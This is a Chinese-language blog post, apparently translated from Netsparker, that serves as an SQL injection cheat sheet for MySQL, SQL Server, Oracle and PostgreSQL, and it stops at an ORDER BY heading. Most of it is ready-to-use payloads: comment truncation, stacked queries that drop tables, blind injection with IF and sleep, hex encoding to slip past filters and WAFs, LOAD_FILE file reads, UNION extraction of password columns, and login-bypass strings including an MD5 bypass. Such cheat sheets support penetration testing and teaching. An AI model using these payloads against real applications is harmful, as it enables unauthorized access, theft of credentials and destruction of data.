{"title":"SQL注入备忘录","date":"2018-08-07T05:48:11.000Z","slug":"sql-injection-cheat-sheet","tags":["sql-injection"],"updated":"2018-09-16T09:34:48.620Z","content":"<p>转自：<a href=\"https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/\" target=\"_blank\" rel=\"noopener\">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p>\n<h1 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h1><h2 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h2><h3 id=\"单行注释\"><a href=\"#单行注释\" class=\"headerlink\" title=\"单行注释\"></a>单行注释</h3><ul>\n<li><p><code>--</code> (MySQL | SQLServer)</p>\n<p>DROP sample; –</p>\n</li>\n<li><p><code>#</code> (MySQL)</p>\n<p>DROP sample; #</p>\n</li>\n</ul>\n<h4 id=\"Sample\"><a href=\"#Sample\" class=\"headerlink\" title=\"Sample\"></a>Sample</h4><ul>\n<li><p>Username: admin’–</p>\n</li>\n<li><p>SELECT * FROM members WHERE username = ‘admin’–’ AND password = ‘password’ </p>\n</li>\n</ul>\n<h3 id=\"内联注释\"><a href=\"#内联注释\" class=\"headerlink\" title=\"内联注释\"></a>内联注释</h3><p>  注释掉查询的多余部分，而不是直接截断关闭，可以通过这种方法绕过黑名单、替代空格，混淆，检测数据库版本。</p>\n<ul>\n<li><p>/*Comment Here*/ (MySQL | SQL Server)</p>\n<pre><code>1. DROP/*comment*/sampletable\n\n2. DR/**/OP/*bypass blacklisting*/sampletable\n\n3. SELECT/*avoid-spaces*/password/**/FROM/**/Members\n</code></pre></li>\n<li><p>/*! MySQL Special SQL */ (MySQL) </p>\n<p>   这是MySQL特有的语法，可以用来检测数据库版本，如果在注释中注入代码，它会在数据库中被执行。 </p>\n<ol>\n<li>SELECT /<em>!32302 1/0, </em>/ 1 FROM tablename</li>\n</ol>\n</li>\n</ul>\n<h4 id=\"Sample-1\"><a href=\"#Sample-1\" class=\"headerlink\" title=\"Sample\"></a>Sample</h4><ul>\n<li><p>ID: 10; DROP TABLE members /* </p>\n</li>\n<li><p>SELECT /*!32302 1/0, */ 1 FROM tablename </p>\n<p>如果数据库版本大于<code>3.23.02</code>会报错。</p>\n</li>\n</ul>\n<h2 id=\"堆叠查询\"><a href=\"#堆叠查询\" class=\"headerlink\" title=\"堆叠查询\"></a>堆叠查询</h2><p>  可以在一次事务中，执行多个查询。</p>\n<ul>\n<li><p><code>;</code> (SQL Server)</p>\n<p>SELECT * FROM members; DROP members–</p>\n</li>\n</ul>\n<h2 id=\"If-语句\"><a href=\"#If-语句\" class=\"headerlink\" title=\"If 语句\"></a>If 语句</h2><p>  通过IF语句，判断响应的内容，可以进行盲注。</p>\n<h3 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h3><ul>\n<li><p>IF(condition,true-part,false-part) </p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">IF</span>(<span class=\"number\">1</span>=<span class=\"number\">1</span>,<span class=\"string\">'true'</span>,<span class=\"string\">'false'</span>)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"SQL-Server\"><a href=\"#SQL-Server\" class=\"headerlink\" title=\"SQL Server\"></a>SQL Server</h3><ul>\n<li><p>IF condition true-part ELSE false-part</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IF (1=1) <span class=\"keyword\">SELECT</span> <span class=\"string\">'true'</span> <span class=\"keyword\">ELSE</span> <span class=\"keyword\">SELECT</span> <span class=\"string\">'false'</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"Oracle\"><a href=\"#Oracle\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h3>  <figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">BEGIN</span></span><br><span class=\"line\"><span class=\"keyword\">IF</span> condition <span class=\"keyword\">THEN</span> <span class=\"literal\">true</span>-part; </span><br><span class=\"line\">ELSE false-part;</span><br><span class=\"line\"><span class=\"keyword\">END</span> <span class=\"keyword\">IF</span>;</span><br><span class=\"line\"><span class=\"keyword\">END</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">IF (1=1) THEN dbms_lock.sleep(3);</span><br><span class=\"line\">ELSE dbms_lock.sleep(0);</span><br><span class=\"line\"><span class=\"keyword\">END</span> <span class=\"keyword\">IF</span>;</span><br><span class=\"line\"><span class=\"keyword\">END</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"PostgreSQL\"><a href=\"#PostgreSQL\" class=\"headerlink\" title=\"PostgreSQL\"></a>PostgreSQL</h3>  <figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">CASE</span> <span class=\"keyword\">WHEN</span> condition <span class=\"keyword\">THEN</span> <span class=\"literal\">true</span>-part <span class=\"keyword\">ELSE</span> <span class=\"literal\">false</span>-part <span class=\"keyword\">END</span>;</span><br></pre></td></tr></table></figure>\n  <figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">CASE</span> WEHEN (<span class=\"number\">1</span>=<span class=\"number\">1</span>) <span class=\"keyword\">THEN</span> <span class=\"string\">'A'</span> <span class=\"keyword\">ELSE</span> <span class=\"string\">'B'</span><span class=\"keyword\">END</span>;</span><br></pre></td></tr></table></figure>\n<h4 id=\"Sample-2\"><a href=\"#Sample-2\" class=\"headerlink\" title=\"Sample\"></a>Sample</h4>  <figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ((<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>) = <span class=\"string\">'sa'</span> <span class=\"keyword\">OR</span> (<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>) = <span class=\"string\">'dbo'</span>) <span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">else</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>/<span class=\"number\">0</span> (S)</span><br></pre></td></tr></table></figure>\n<p>  如果当前账号不是<code>sa</code>或<code>dbo</code>，会报 <code>divide by zero error</code> 错误。</p>\n<h2 id=\"使用整型\"><a href=\"#使用整型\" class=\"headerlink\" title=\"使用整型\"></a>使用整型</h2><p>  可以用来绕过<code>magic_quotes()</code>等过滤器，甚至是<code>WAF</code></p>\n<ul>\n<li><p>0xHEXNUMBER (MySQL | SQL Server)<br>You can  write hex like these; </p>\n</li>\n<li><p>SELECT CHAR(0x66) (SQL Server) </p>\n</li>\n<li><p>SELECT 0x5045 (这里不是数值，而是从hex转换来的字符) (MySQL) </p>\n</li>\n<li><p>SELECT 0x50 + 0x45 (这里是数值) (MySQL)</p>\n</li>\n</ul>\n<h2 id=\"字符串操作\"><a href=\"#字符串操作\" class=\"headerlink\" title=\"字符串操作\"></a>字符串操作</h2><h3 id=\"字符串连接\"><a href=\"#字符串连接\" class=\"headerlink\" title=\"字符串连接\"></a>字符串连接</h3><ul>\n<li><p><code>+</code> (SQL Server)</p>\n<p>SELECT login + ‘-‘ + password FROM members</p>\n</li>\n<li><p><code>||</code> (MySQL | Oracle)</p>\n<p>SELECT login || ‘-‘ || password FROM members</p>\n<pre><code>如果MySQL在ANSI模式下运行，它被当作逻辑运算符，而返回0。\n\n更好的方法是，使用 CONCAT()\n</code></pre></li>\n</ul>\n<ul>\n<li><p>CONCAT(str1,str2,…) (MySQL)</p>\n<p>SELECT CONCAT(login, password) FROM members</p>\n</li>\n</ul>\n<h2 id=\"无引号字符串\"><a href=\"#无引号字符串\" class=\"headerlink\" title=\"无引号字符串\"></a>无引号字符串</h2><ul>\n<li><p>0x457578 (MySQL)</p>\n<p>SELECT 0x457578</p>\n<p>这里的十六进制数字会返回一个字符串。</p>\n<p>MySQL有HEX()函数，可以生成hex，像下面一样。</p>\n<p>SELECT CONCAT(‘0x’,HEX(‘c:\\boot.ini’))</p>\n</li>\n<li><p>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (MySQL) </p>\n<p>将会返回’KLM’</p>\n</li>\n<li><p>SELECT CHAR(75)+CHAR(76)+CHAR(77) (SQL Server) </p>\n<p>将会返回’KLM’</p>\n</li>\n<li><p>SELECT CHR(75)||CHR(76)||CHR(77) (Oracle) </p>\n<p>将会返回’KLM’</p>\n</li>\n<li><p>SELECT (CHaR(75)||CHaR(76)||CHaR(77)) (Postgresql) </p>\n<p>将会返回’KLM’</p>\n</li>\n</ul>\n<h4 id=\"Samples\"><a href=\"#Samples\" class=\"headerlink\" title=\"Samples\"></a>Samples</h4><p>  SELECT LOAD_FILE(0x633A5C626F6F742E696E69) (MySQL) </p>\n<p>  This will show the content of c:\\boot.ini</p>\n<h2 id=\"字符串修改\"><a href=\"#字符串修改\" class=\"headerlink\" title=\"字符串修改\"></a>字符串修改</h2><ul>\n<li><p>ASCII() (SQL Server | MySQL | Postgresql)</p>\n<p>返回字符的ASCII码</p>\n</li>\n<li><p>CHAR() (SQL Server | MySQL)</p>\n<p>返回ASCII码对应的字符</p>\n</li>\n</ul>\n<h2 id=\"UNION-联合查询注入\"><a href=\"#UNION-联合查询注入\" class=\"headerlink\" title=\"UNION 联合查询注入\"></a>UNION 联合查询注入</h2><p>  可以通过<code>unin</code>进行跨表查询。</p>\n<pre><code>1. SELECT header, txt FROm news UNION ALL SELECT name, pass FROM members\n\n2. &apos; UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1--\n</code></pre><h3 id=\"UNION-关于语言的问题的修复\"><a href=\"#UNION-关于语言的问题的修复\" class=\"headerlink\" title=\"UNION - 关于语言的问题的修复\"></a>UNION - 关于语言的问题的修复</h3><p>  在使用联合注入时，有时会因为不同的语言设置（表设置、字段设置、组合表/db设置等）而出现错误。这不常见，但如果你处理的是日语、俄语、土耳其语等应用，你就会遇到它。</p>\n<ul>\n<li><p>SQL Server</p>\n<p>使用 <code>field</code> <strong><code>COLLATE</code></strong> <code>SQL_Latin1_General_Cp1254_CS_AS</code> 或其它有效参数</p>\n</li>\n<li><p>MySQL</p>\n<p><code>Hex()</code></p>\n</li>\n</ul>\n<h2 id=\"绕过登录点\"><a href=\"#绕过登录点\" class=\"headerlink\" title=\"绕过登录点\"></a>绕过登录点</h2><p>可以尝试以下：</p>\n<ul>\n<li><p>admin’ –</p>\n</li>\n<li><p>admin’ #</p>\n</li>\n<li><p>admin’/*</p>\n</li>\n<li><p>‘ or 1=1–</p>\n</li>\n<li><p>‘ or 1=1#</p>\n</li>\n<li><p>‘ or 1=1/*</p>\n</li>\n<li><p>‘) or ‘1’=’1–</p>\n</li>\n<li><p>‘) or (‘1’=’1–c</p>\n</li>\n<li><p>登录到其它用户 (MySQL | SQL Server)</p>\n<p>‘ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–</p>\n</li>\n</ul>\n<h2 id=\"绕过密码MD5验证的登录点\"><a href=\"#绕过密码MD5验证的登录点\" class=\"headerlink\" title=\"绕过密码MD5验证的登录点\"></a>绕过密码MD5验证的登录点</h2><p>  可以通过联合查询，提交一个已知密码的MD5，这时候，数据库会优先比较你提交的MD5，从而绕过登录。</p>\n<blockquote>\n<p>Username :<br>admin’ AND 1=0 UNION ALL SELECT ‘admin’, ‘81dc9bdb52d04dc20036dbd8313ed055’<br>Password : 1234</p>\n</blockquote>\n<h2 id=\"通过报错发现字段名\"><a href=\"#通过报错发现字段名\" class=\"headerlink\" title=\"通过报错发现字段名\"></a>通过报错发现字段名</h2><h3 id=\"使用-HAVING-BY-MySQL\"><a href=\"#使用-HAVING-BY-MySQL\" class=\"headerlink\" title=\"使用 HAVING BY (MySQL)\"></a>使用 <code>HAVING BY</code> (MySQL)</h3><ul>\n<li><p>‘ HAVING 1=1 –</p>\n</li>\n<li><p>‘ GROUP BY table.columnfromerror1 HAVING 1=1 –</p>\n</li>\n<li><p>‘ GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 –</p>\n</li>\n<li><p>‘ GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 – 依次类推</p>\n</li>\n</ul>\n<h3 id=\"使用-ORDER-BY\"><a href=\"#使用-ORDER-BY\" class=\"headerlink\" title=\"使用 ORDER BY (*)\"></a>使用 <code>ORDER BY</code> (*)</h3>","prev":{"title":"日常心路-180909","slug":"daily-life-20180909"},"next":{"title":"远程溢出之古怪地鼠ERRATICGOPHER","slug":"exploit-erraticgopher"},"link":"http://Jayl1n.github.io/post/sql-injection-cheat-sheet/","toc":[{"title":"语法","id":"语法","index":"1","children":[{"title":"注释","id":"注释","index":"1.1","children":[{"title":"单行注释","id":"单行注释","index":"1.1.1"},{"title":"内联注释","id":"内联注释","index":"1.1.2"}]},{"title":"堆叠查询","id":"堆叠查询","index":"1.2"},{"title":"If 语句","id":"If-语句","index":"1.3","children":[{"title":"MySQL","id":"MySQL","index":"1.3.1"},{"title":"SQL Server","id":"SQL-Server","index":"1.3.2"},{"title":"Oracle","id":"Oracle","index":"1.3.3"},{"title":"PostgreSQL","id":"PostgreSQL","index":"1.3.4"}]},{"title":"使用整型","id":"使用整型","index":"1.4"},{"title":"字符串操作","id":"字符串操作","index":"1.5","children":[{"title":"字符串连接","id":"字符串连接","index":"1.5.1"}]},{"title":"无引号字符串","id":"无引号字符串","index":"1.6"},{"title":"字符串修改","id":"字符串修改","index":"1.7"},{"title":"UNION 联合查询注入","id":"UNION-联合查询注入","index":"1.8","children":[{"title":"UNION - 关于语言的问题的修复","id":"UNION-关于语言的问题的修复","index":"1.8.1"}]},{"title":"绕过登录点","id":"绕过登录点","index":"1.9"},{"title":"绕过密码MD5验证的登录点","id":"绕过密码MD5验证的登录点","index":"1.10"},{"title":"通过报错发现字段名","id":"通过报错发现字段名","index":"1.11","children":[{"title":"使用 <code>HAVING BY</code> (MySQL)","id":"使用-HAVING-BY-MySQL","index":"1.11.1"},{"title":"使用 <code>ORDER BY</code> (*)","id":"使用-ORDER-BY","index":"1.11.2"}]}]}]}